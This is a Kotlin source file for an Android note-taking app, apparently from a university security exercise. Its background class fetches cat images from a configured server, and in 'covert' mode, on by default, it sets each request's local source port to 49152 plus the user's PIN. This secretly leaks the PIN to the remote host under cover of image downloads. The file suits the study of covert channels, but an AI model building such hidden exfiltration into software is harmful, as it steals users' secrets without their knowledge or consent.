package nl.utwente.ewi.scs.secretnotestaker.secretnotestaker

import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.net.ServerSocket
import java.net.SocketException
import java.net.UnknownHostException
import javax.net.SocketFactory

import android.graphics.BitmapFactory
import android.preference.PreferenceManager
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import java.util.BitSet
import java.io.IOException

import kotlin.system.measureTimeMillis

class BackgroundUpdater(var activity: TakesNotesActivity?) : Runnable {
    private var stopNow = false
    private lateinit var thread: Thread

    private var pin = 9999
    private var port = 9999
    private var transmitting = false
    private var running = false

    fun start() {
        thread = Thread(this)
        stopNow = false
        thread.start()
    }

    fun stop() {
        activity = null
        stopNow = true
        thread.interrupt()
    }

    fun getUrl(): String {
        val sharedPref = PreferenceManager.getDefaultSharedPreferences(activity)
        val url = sharedPref.getString("url", "")
        // url should contain the URL to the cat image server without the trailing /randomcat

        if (url.takeLast(1) == "/") {
            return url + "randomcat"
        } else {
            return url + "/randomcat"
        }
    }

    fun setPin(pin : String) {
        this.pin = pin.toInt()
        this.running = true
        this.transmitting = true
    }

    fun isLocalPortFree(port : Int) : Boolean {
        var socket: ServerSocket? = null

        try {
            socket = ServerSocket(port)
        } catch (e: IOException) {
            return false
        } finally {
            if (socket != null) {
                try {
                    socket.close()
                } catch(e: IOException) { }
            }
        }

        return true
    }

    fun findNextFreeLocalPort(port : Int) : Int {
        var newPort = port

        do {
            newPort = newPort + 1

            if (newPort >= 65535) {
                newPort = 49152
            }
        } while (!isLocalPortFree(newPort))

        return newPort
    }

    fun boolToInt(bool : Boolean) = if (bool) 1 else 0

    override fun run() {
        val sharedPref = PreferenceManager.getDefaultSharedPreferences(activity)

        while (true) {
            if (stopNow) {
                // Activity has been terminated, also terminate the thread
                return
            }
            if (!this.running) {
                continue
            }
            try {
                val url = if (sharedPref.getBoolean("covert", true)) {
                    // Find a suitable port and measure execution time
                    val millis = measureTimeMillis {
                        Log.e("Network", "hello 2 ${this.transmitting}")

                        if (this.transmitting) {
                            this.port = 49152 + pin
                            this.transmitting = false;
                        } else {
                            this.port = this.findNextFreeLocalPort(this.port)
                        }
                    }

                    try {
                        Thread.sleep(1000 - millis)
                    } catch (e: InterruptedException) { }

                    Log.e("Network", "Port ${this.port} ${this.transmitting}")

                    // Get a http handler implementation
                    val httpHandler = BoundHttpHandler(this.port)

                    // Get the URL of our randomcat server
                    URL(null as? URL, getUrl(), httpHandler)
                } else {
                    URL(getUrl())
                }

                // Open an HTTP connection to that URL
                val urlConnection = url.openConnection() as HttpURLConnection

                try {
                    // Try to decode a bitmap from the server response
                    var bitmap = BitmapFactory.decodeStream(urlConnection.inputStream)

                    // Update the activity with the new images.
                    activity!!.runOnUiThread(UpdateImageRequest(bitmap, activity!!))
                } catch (e: Exception) {
                    Log.e("Network", "HTTP request failed for URL: " + url + " or download problem", e)
                } finally {
                    urlConnection.disconnect()
                }
            } catch (e: Exception) {
                Log.e("Network", "Problem with download", e)
            }
            Log.d("Background", "Completed network operation, now sleeping")
            try {
                Thread.sleep(if (sharedPref.getBoolean("covert", true)) 4000 else 5000)
            } catch (e: InterruptedException) {

            }
        }
    }
}
